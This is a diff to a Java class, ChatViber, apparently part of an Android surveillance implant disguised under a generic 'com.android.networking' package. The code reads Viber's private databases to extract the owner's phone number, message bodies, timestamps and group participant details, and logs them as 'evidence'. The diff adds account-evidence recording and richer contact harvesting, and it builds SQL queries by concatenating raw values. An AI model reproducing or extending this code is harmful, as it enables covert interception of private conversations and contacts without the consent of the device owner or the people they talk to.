@@ -22,6 +22,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.db.GenericSqliteHelper;
 import com.android.networking.db.RecordVisitor;
 import com.android.networking.file.Path;
+import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
 
@@ -68,6 +69,8 @@ public class ChatViber extends SubModuleChat {
 		lastViber = markup.unserialize(new Hashtable<String, Long>());
 		try {
 			account = readMyPhoneNumber();
+			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.VIBER, account);
+			
 			readViberMessageHistory();
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
@@ -91,18 +94,11 @@ public class ChatViber extends SubModuleChat {
 			ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
 			Object one = oInputStream.readObject();
 			number = (String) one;
-		} catch (FileNotFoundException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		} catch (StreamCorruptedException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		} catch (ClassNotFoundException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				e.printStackTrace();
+				Check.log(TAG + " (readMyPhoneNumber) Error: " + e);
+			}
 		}
 
 		return number;
@@ -152,11 +148,8 @@ public class ChatViber extends SubModuleChat {
 
 					// retrieves the lastConvId recorded as evidence for this
 					// conversation
-					
 					String thread = Long.toString(sc.id);
-					
 					long lastConvId = lastViber.containsKey(thread) ? lastViber.get(thread) : 0;
-
 					
 					if (sc.date > lastConvId) {
 						if (groups.isGroup(thread) && !groups.hasMemoizedGroup(thread)) {
@@ -167,7 +160,6 @@ public class ChatViber extends SubModuleChat {
 						if (lastReadId > 0) {
 							updateMarkupViber(thread, lastReadId, true);
 						}
-
 					}
 				}
 			} else {
@@ -178,15 +170,12 @@ public class ChatViber extends SubModuleChat {
 		} finally {
 			readChatSemaphore.release();
 		}
-
 	}
-
 	
 	private long fetchMessages(GenericSqliteHelper helper, final ViberConversation conversation, long lastConvId) {
 
 		// select author, body_xml from Messages where convo_id == 118 and id >=
 		// 101 and body_xml != ''
-
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
@@ -202,7 +191,7 @@ public class ChatViber extends SubModuleChat {
 					String peer = cursor.getString(1);
 					String body = cursor.getString(2);
 					long timestamp = cursor.getLong(3);
-					Date date = new Date(timestamp * 1000L);
+					Date date = new Date(timestamp);
 
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp);
@@ -287,14 +276,15 @@ public class ChatViber extends SubModuleChat {
 		return conversations;
 	}
 
+	// fetch participants.
 	private void fetchGroup(GenericSqliteHelper helper, final String thread_id) {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchGroup) : " + thread_id);
 		}
 
-		String[] projection = { "number", "contact_name" };
-		String selection = "thread_id" + "='" + thread_id + "'";
+		String[] projection = { "contact_id", "number", "contact_name", "display_name" };
+		String selection = "thread_id" + "='" + thread_id + "' and contact_id >= 0" ;
 
 		// final Set<String> remotes = new HashSet<String>();
 		//groups.addPeerToGroup(thread_id, "-1");
@@ -302,11 +292,15 @@ public class ChatViber extends SubModuleChat {
 
 			@Override
 			public long cursor(Cursor cursor) {
-				String number = cursor.getString(0);
-				String name = cursor.getString(1);
+				String id = cursor.getString(0);
+				String number = cursor.getString(1);
+				String name = cursor.getString(2);
+				String display_name = cursor.getString(3);
+				
+				Contact contact = new Contact( id, number, name, display_name );
 				// remotes.add(remote);
 				if (number != null) {
-					groups.addPeerToGroup(thread_id, number);
+					groups.addPeerToGroup(thread_id, contact);
 				}
 				return 0;
 			}
